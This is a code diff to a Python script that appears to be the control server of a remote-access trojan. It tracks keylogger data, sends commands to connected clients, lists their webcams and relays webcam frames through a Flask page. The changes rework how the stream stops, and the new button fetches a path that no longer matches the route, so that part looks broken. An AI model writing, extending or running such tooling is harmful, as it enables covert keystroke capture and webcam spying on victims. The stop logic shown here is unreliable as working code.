@@ -15,9 +15,8 @@ server_thread = None
 streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
-flask_thread = None  # Global variable to store the Flask thread
 
-
+# HTML template for video streaming with a stop button
 html_template = """
 <!doctype html>
 <html lang="en">
@@ -32,7 +31,7 @@ html_template = """
     <button onclick="stopStreaming()">Stop Streaming</button>
     <script>
       function stopStreaming() {
-        fetch('/stop_streaming_{{ client_id }}', { method: 'POST' })
+        fetch('/stop_streaming')
           .then(response => response.text())
           .then(data => alert(data));
       }
@@ -40,7 +39,6 @@ html_template = """
   </body>
 </html>
 """
-
 
 def start_streaming(client_socket, mode, client_id):
     global streaming
@@ -59,20 +57,25 @@ def start_streaming(client_socket, mode, client_id):
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-    @app.route(f'/stop_streaming_{client_id}', methods=['GET', 'POST'])
-    def stop_streaming_route():
+    @app.route(f'/stop_streaming_{client_id}')
+    def stop_streaming():
         global streaming
         streaming = False
-        stop_flask()
+        shutdown_server()
         return "Streaming stopped", 200
 
-    print(Fore.BLUE + f"[ * ] Opening player at: http://127.0.0.1:5000")
+    def shutdown_server():
+        func = request.environ.get('werkzeug.server.shutdown')
+        if func is None:
+            raise RuntimeError('Not running with the Werkzeug Server')
+        func()
+
+    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
-        # Run the Flask app in a separate thread to handle the streaming
-    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
-    flask_thread.start()
-  
+    # Run the Flask app in a separate thread to handle the streaming
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+
 def generate_frames(client_socket, client_id):
     global streaming
     while streaming:
@@ -180,14 +183,6 @@ def handle_client(client_socket, addr):
             client_socket.send(command.encode('utf-8'))
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
-
-def stop_flask():
-    global flask_thread
-    if flask_thread is not None:
-        print(Fore.YELLOW + "[ * ] Stopping Flask server...")
-        flask_thread.join()  # Wait for the thread to finish
-        flask_thread = None
-
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
